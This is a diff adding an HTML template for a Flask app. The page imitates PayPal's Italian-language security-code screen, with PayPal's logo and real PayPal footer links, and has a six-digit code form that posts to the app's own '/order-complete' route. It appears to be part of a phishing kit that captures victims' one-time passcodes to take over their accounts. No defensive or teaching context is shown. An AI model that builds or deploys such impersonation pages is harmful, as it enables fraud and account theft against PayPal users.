@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign up for Personal account</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='verify-number.css') }}">
+    <script src="https://kit.fontawesome.com/a8c88432fd.js" crossorigin="anonymous"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <article>
+        <div class="box">
+            <img src="../static/paypal-mark-color.svg" class="logo-mini-paypal">
+            <div class="component-title">
+                <p>Immetti il codice</p>
+            </div>
+            <div class="component-description">
+                <span>
+                    Abbiamo inviato un codice di sicurezza +39 ••• ••• •••
+                </span>
+            </div>
+                <form action="/order-complete" method="post">
+                   <div class="component-number-phone">
+                    <input id="number-1" name="number-1" class="number-phone">
+                    <input id="number-2" name="number-2" class="number-phone">
+                    <input id="number-3" name="number-3" class="number-phone">
+                    <input id="number-4" name="number-4" class="number-phone">
+                    <input id="number-5" name="number-5" class="number-phone">
+                    <input id="number-6" name="number-6" class="number-phone">
+                </div>
+                <div class="component-button">
+                    <a href="#">
+                        <button type="submit" class="button-continue">Invia</button>
+                    </a>
+                </div>
+            </form>
+        </div>
+    </article>
+    <footer>
+        <a href="https://www.paypal.com/en/smarthelp/contact-us">Contact us</a>
+        <a href="https://www.paypal.com/en/webapps/mpp/ua/privacy-full">Privacy</a>
+        <a href="https://www.paypal.com/en/webapps/mpp/ua/legalhub-full">Legal Agreements</a>
+        <a href="https://www.paypal.com/en/webapps/mpp/country-worldwide">On world</a>
+    </footer>
+</body>
+</html>
